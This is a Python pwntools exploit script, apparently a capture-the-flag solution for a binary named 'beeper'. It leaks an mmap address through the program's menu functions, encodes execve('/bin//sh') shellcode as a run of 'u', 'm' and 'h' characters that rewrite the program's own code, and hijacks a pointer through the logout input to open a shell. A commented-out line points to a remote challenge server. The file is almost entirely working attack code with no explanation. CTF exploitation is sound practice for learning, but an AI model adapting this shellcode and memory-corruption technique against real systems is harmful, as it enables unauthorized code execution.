#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"
from pwn import *

# Settings
context.terminal = ['tmux', 'splitw', '-h']

EXEC = 0x0000555555554000

#io = remote("47.98.57.19", 23333)
#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})
io = process("./beeper")

# gdb
def attach(addr):
    gdb.attach(io, execute='b *0x%x' % (EXEC+addr))

#attach(0xFAC)
#attach(0xEF7)
io.recvuntil('password:')
passwd = '\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf'
io.send(passwd.ljust(0x7d0, '\0'))

def show_message(idx):
    io.recvuntil('choice>>')
    io.sendline('1')
    io.recvuntil('number:')
    io.sendline(str(idx))

def remove_message(idx):
    io.recvuntil('choice>>')
    io.sendline('2')
    io.recvuntil('remove?')
    io.sendline(str(idx))

def buy_phone():
    io.recvuntil('choice>>')
    io.sendline('3')

def logout(payload):
    io.recvuntil('choice>>')
    io.sendline('4')
    io.recvuntil('Homura Beeper,plz login!')
    io.sendline(payload)

io.interactive()

remove_message(2)
remove_message(0)

show_message(0)
io.recvuntil('phone number:')
mmap_addr = u64(io.recv(8))
log.info("mmap_addr : %#x" % mmap_addr)

text = [0x68,0x6F,0x64,0x20,0x01,0x81,0x34,0x24,0x01,0x01,0x01,0x01,0x48,0xB8,0x75,0x79,0x20,0x61,0x20,0x70,0x68,0x6F,0x50,0x48,0xB8,0x61,0x6E,0x20,0x6E,0x6F,0x74,0x20,0x62,0x50,0x48,0xB8,0x65,0x72,0x2C,0x79,0x6F,0x75,0x20,0x63,0x50,0x48,0xB8,0x42,0x61,0x64,0x20,0x68,0x61,0x63,0x6B,0x50,0x6A,0x01,0x58,0x6A,0x01,0x5F,0x6A,0x23,0x5A,0x48,0x89,0xE6,0x0F,0x05,0xC9,0xC3,0x00][:23]
shellcode = [ord(i) for i in '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05']
print text
print shellcode

mycode = ''

for i in xrange(len(shellcode)):
    if text[i] > shellcode[i]:
        mycode += 'u'*(text[i]-shellcode[i])
        mycode += 'h'
        pass
    elif text[i] < shellcode[i]:
        mycode += 'm'*(shellcode[i]-text[i])
        mycode += 'h'
        pass
    else:
        mycode += 'h'

mycode += '\0'

payload = passwd.ljust(0x68, '\0')
payload += p64(mmap_addr)
payload += mycode
logout(payload)
buy_phone()

io.interactive()
